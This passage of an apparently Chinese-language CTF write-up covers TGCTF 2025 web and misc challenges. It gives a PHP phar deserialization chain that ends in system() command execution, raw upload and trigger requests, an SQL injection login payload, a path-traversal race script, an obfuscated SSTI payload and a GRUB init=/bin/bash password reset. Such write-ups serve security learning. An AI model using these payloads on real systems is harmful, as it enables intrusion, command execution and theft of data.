Connection: keep-alive</code></pre>

<h3 id="什么文件上传？（复仇）"><a href="#什么文件上传？（复仇）" class="headerlink" title="什么文件上传？（复仇）"></a>什么文件上传？（复仇）</h3><p>file_exists可以出发phar。易得：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday &#123;
    public $learn;
    public $study&#x3D;&quot;study&quot;;
    public $try;
    public function __construct()
    &#123;
        $this-&gt;learn &#x3D; &quot;learn&lt;br&gt;&quot;;
    &#125;
    public function __destruct()
    &#123;
        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;
        return $this-&gt;study-&gt;hard();
    &#125;
&#125;
class today &#123;
    public $doing;
    public $did;
    public $done;
    public function __construct()&#123;
        $this-&gt;did &#x3D; &quot;What you did makes you outstanding.&lt;br&gt;&quot;;
    &#125;
    public function __call($arg1, $arg2)
    &#123;
        $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;
        echo $this-&gt;done;
        if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666)&#123;
            return $this-&gt;doing();
        &#125;
        else&#123;
            return $this-&gt;doing-&gt;better;
        &#125;
    &#125;
&#125;
class tommoraw &#123;
    public $good;
    public $bad;
    public $soso;
    public function __invoke()&#123;
        $this-&gt;good&#x3D;&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;
        echo $this-&gt;good;
    &#125;
    public function __get($arg1)&#123;
        $this-&gt;bad&#x3D;&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;
    &#125;

&#125;
class future&#123;
    private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;out-&gt;useful7) &#123;
            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;
            system(&#39;whoami&#39;);
        &#125;
    &#125;
    public function __toString()&#123;
        echo &quot;This is your future.&lt;br&gt;&quot;;
        system($_POST[&quot;wow&quot;]);
        return &quot;win&quot;;
    &#125;
    public function __destruct()&#123;
        $this-&gt;no &#x3D; &quot;no&quot;;
        return $this-&gt;no;
    &#125;
&#125;
$a &#x3D; new yesterday();
$a -&gt; study &#x3D; new today();
$a -&gt; study -&gt; doing &#x3D; new future();

&#x2F;&#x2F; 后缀必须为phar
$phar &#x3D; new Phar(&quot;evil.phar&quot;);
$phar-&gt;startBuffering();
&#x2F;&#x2F; 设置 stubb
$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
&#x2F;**
将自定义的 meta-data 存入 manifest
这个函数需要在php.ini中修改 phar.readonly 为 Off
否则的话会抛出 
creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly 
异常.
*&#x2F;
$$phar-&gt;setMetadata($$a);
&#x2F;&#x2F; 添加需压缩的文件
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
$phar-&gt;stopBuffering();

?&gt;</code></pre>

<p>随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
if(isset($_FILES[&#39;file&#39;])) &#123;
    $uploadDir &#x3D; &#39;uploads&#x2F;&#39;;
    if(!file_exists($uploadDir)) &#123;
        mkdir($uploadDir, 0777, true);
    &#125;

    &#x2F;&#x2F; 白名单允许的扩展名
    $allowedExtensions &#x3D; [&#39;atg&#39;];
    $fileName &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);
    $fileExtension &#x3D; strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    &#x2F;&#x2F; 检查文件扩展名
    if(!in_array($fileExtension, $allowedExtensions)) &#123;
        die(&quot;hacker！&quot;);
    &#125;

    $uploadFile &#x3D; $uploadDir . $fileName;

    if(move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadFile)) &#123;
        echo &quot;文件已保存到：$uploadFile ！&quot;;
    &#125; else &#123;
        echo &quot;文件保存出错！&quot;;
    &#125;
&#125;
?&gt;</code></pre>

<p>允许上传atg文件。</p>
<p>后面易得：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30759
Content-Length: 940
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:30759
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary1OUR0mqZmZ8AtAOc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:30759&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary1OUR0mqZmZ8AtAOc
Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;evil.atg&quot;
Content-Type: application&#x2F;octet-stream

GIF89a&lt;?php __HALT_COMPILER(); ?&gt;
此处有不可见字符省略。内容为上述脚本生成的phar
POST &#x2F;class.php?filename&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;evil.atg&#x2F;test.txt HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30759
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;x-www-form-urlencoded
Connection: keep-alive
Content-Length: 7

wow&#x3D;env</code></pre>

<h3 id="TGCTF-2025-后台管理"><a href="#TGCTF-2025-后台管理" class="headerlink" title="TGCTF 2025 后台管理"></a>TGCTF 2025 后台管理</h3><p>反斜杠转义字符串中的’，然后在password里打SQL注入。</p>
<p>误打误撞试出来flag在flag表里（（（</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;login HTTP&#x2F;1.1
Host: 124.71.147.99:9045
Content-Length: 48
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;124.71.147.99:9045
Content-Type: application&#x2F;x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;124.71.147.99:9045&#x2F;login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username&#x3D;1\&amp;password&#x3D;union select *,2 from flag#</code></pre>

<p>在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}</p>
<h3 id="老登，炸鱼来了？"><a href="#老登，炸鱼来了？" class="headerlink" title="老登，炸鱼来了？"></a>老登，炸鱼来了？</h3><p>竞争safe变量。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> aiohttp
<span class="token keyword">import</span> asyncio
<span class="token keyword">import</span> time

<span class="token keyword">class</span> <span class="token class-name">Solver</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> baseUrl<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>baseUrl <span class="token operator">=</span> baseUrl
        self<span class="token punctuation">.</span>READ_FILE_ENDPOINT <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>baseUrl<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        self<span class="token punctuation">.</span>VALID_CHECK_PARAMETER <span class="token operator">=</span> <span class="token string">'/write?name=123.md&amp;content=flag&amp;format=markdown'</span>
        self<span class="token punctuation">.</span>INVALID_CHECK_PARAMETER <span class="token operator">=</span> <span class="token string">'/read?name=../../../../../flag'</span>
        self<span class="token punctuation">.</span>RACE_CONDITION_JOBS <span class="token operator">=</span> <span class="token number">100</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">setSessionCookie</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">await</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>baseUrl<span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">raceValidationCheck</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>READ_FILE_ENDPOINT<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>parameter<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> response<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">raceCondition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>RACE_CONDITION_JOBS<span class="token punctuation">)</span><span class="token punctuation">:</span>
            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>raceValidationCheck<span class="token punctuation">(</span>session<span class="token punctuation">,</span> self<span class="token punctuation">.</span>VALID_CHECK_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span>
            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>raceValidationCheck<span class="token punctuation">(</span>session<span class="token punctuation">,</span> self<span class="token punctuation">.</span>INVALID_CHECK_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
            <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># wait for the reverse proxy creation</span>

            attempts <span class="token operator">=</span> <span class="token number">1</span>
            finishedRaceConditionJobs <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Attempts #</span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempts<span class="token punctuation">&#125;</span></span><span class="token string"> - Finished race condition jobs: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>finishedRaceConditionJobs<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\r'</span><span class="token punctuation">)</span>

                results <span class="token operator">=</span> <span class="token keyword">await</span> self<span class="token punctuation">.</span>raceCondition<span class="token punctuation">(</span>session<span class="token punctuation">)</span>
                attempts <span class="token operator">+=</span> <span class="token number">1</span>
                finishedRaceConditionJobs <span class="token operator">+=</span> self<span class="token punctuation">.</span>RACE_CONDITION_JOBS
                <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token string">'TGCTF&#123;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
                        <span class="token keyword">continue</span>

                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'\n[+] We won the race window! Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    baseUrl <span class="token operator">=</span> <span class="token string">'http://node1.tgctf.woooo.tech:30308'</span> <span class="token comment"># for local testing</span>
    <span class="token comment"># baseUrl = 'http://49.13.169.154:8088'</span>
    solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span>baseUrl<span class="token punctuation">)</span>

    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>solver<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a>直面天命（复仇）</h3><p>直接去非复仇版本里读：</p>
<p><a href="http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py">http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py</a></p>
<p>secret_key &#x3D; “直面天命”</p>
<p>然后标准SSTI即可。unicode编码绕过。 。 直面天命g’\u0070\u006f\u0070’’\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f’(‘so’[::-1])’\u0070\u006f\u0070\u0065\u006e’’\u0072\u0065\u0061\u0064’难违</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="next-is-the-end"><a href="#next-is-the-end" class="headerlink" title="next is the end"></a>next is the end</h3><p>手动打开文件夹，得到flag。</p>
<p><img src="/images/1744633170179-41.png" alt="img" loading="lazy"></p>
<h3 id="where-it-is"><a href="#where-it-is" class="headerlink" title="where_it_is"></a>where_it_is</h3><p>百度识图找到另一个视角的正面图。</p>
<p><img src="/images/1744633170179-42.png" alt="img" loading="lazy"></p>
<p>可以模糊看出学校名前两个字**”内湖”**，结合原图的职业二字，在360地图搜索找到对应学校。</p>
<p><img src="/images/1744633170179-43.png" alt="img" loading="lazy"></p>
<p>旁边的站就是港墘站</p>
<p>TGCTF{港墘站}</p>
<h3 id="你的运气是好是坏？"><a href="#你的运气是好是坏？" class="headerlink" title="你的运气是好是坏？"></a>你的运气是好是坏？</h3><p>CTF自然常数（。</p>
<p>flag{114514}</p>
<h3 id="TeamGipsy-ctfer"><a href="#TeamGipsy-ctfer" class="headerlink" title="TeamGipsy&amp;ctfer"></a>TeamGipsy&amp;ctfer</h3><p>vm运行虚拟机，发现有密码。</p>
<p>在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init&#x3D;&#x2F;bin&#x2F;bash，再按F10启动。</p>
<p>然后找到用户名，修改密码为123即可。</p>
<p><img src="/images/1744633170179-44.png" alt="img" loading="lazy"></p>
<p>桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。</p>
<p><img src="/images/1744633170179-45.png" alt="img" loading="lazy"></p>
<p>重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。</p>
<p><img src="/images/1744633170179-46.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-47.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>
<h3 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h3><p>最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。</p>
<p>打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。</p>
<p>所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。</p>
<p><img src="/images/1744633170179-48.png" alt="img" loading="lazy"></p>
<p>将sha512结果存放End&#x2F;sh512.txt</p>
<p><img src="/images/1744633170179-49.png" alt="img" loading="lazy"></p>
<p>deflate压缩，压缩等级1。</p>
<p><img src="/images/1744633170179-50.png" alt="img" loading="lazy"></p>
<p>使用ARCHPR进行明文攻击解压出flag.zip。</p>
<p><img src="/images/1744633170179-51.png" alt="img" loading="lazy"></p>
<p>没法正常解压，使用010的zip模板进行修复。</p>
<p>将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。</p>
<p><img src="/images/1744633170179-52.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-53.png" alt="img" loading="lazy"></p>
<p>TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>
<h3 id="这是啥o-o"><a href="#这是啥o-o" class="headerlink" title="这是啥o_o"></a>这是啥o_o</h3><p>给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码</p>
<p><img src="/images/1744633170179-54.png" alt="img" loading="lazy"></p>
<p>扫描得到提示 time is your fortune ,efficiency is your life</p>
<p>推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西</p>
<p><img src="/images/1744633170179-55.png" alt="img" loading="lazy"></p>
<p>解码得到flag</p>
<pre class="language-Plain" data-language="Plain"><code class="language-Plain">enc&#x3D;[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]
for i in enc:
    print(chr(i),end&#x3D;&#39;&#39;)</code></pre>

<blockquote>
<p>TGCTF{You_caught_up_with_time!}</p>
</blockquote>
<h3 id="你能发现图中的秘密吗"><a href="#你能发现图中的秘密吗" class="headerlink" title="你能发现图中的秘密吗?"></a>你能发现图中的秘密吗?</h3><p>题目给出一个压缩包和一个png,压缩包有密码</p>
<p>png查看red通道的lsb,发现密钥</p>
<p><img src="/images/1744633170179-56.png" alt="img" loading="lazy"></p>
<p>解压后给了一个png一个pdf</p>
<p>查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag</p>
<p><img src="/images/1744633170179-57.png" alt="img" loading="lazy"></p>
<p>final_challenge2.png的一个chunk大小异常。</p>
<p><img src="/images/1744633170179-58.png" alt="img" loading="lazy"></p>
<p>提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。</p>
<p><img src="/images/1744633170179-59.png" alt="img" loading="lazy"></p>
<p>flag{you_are_so_attentive_and_conscientous}</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>cry</tag>
        <tag>web</tag>
        <tag>re</tag>
        <tag>pwn</tag>
        <tag>misc</tag>
      </tags>
  </entry>
</search>
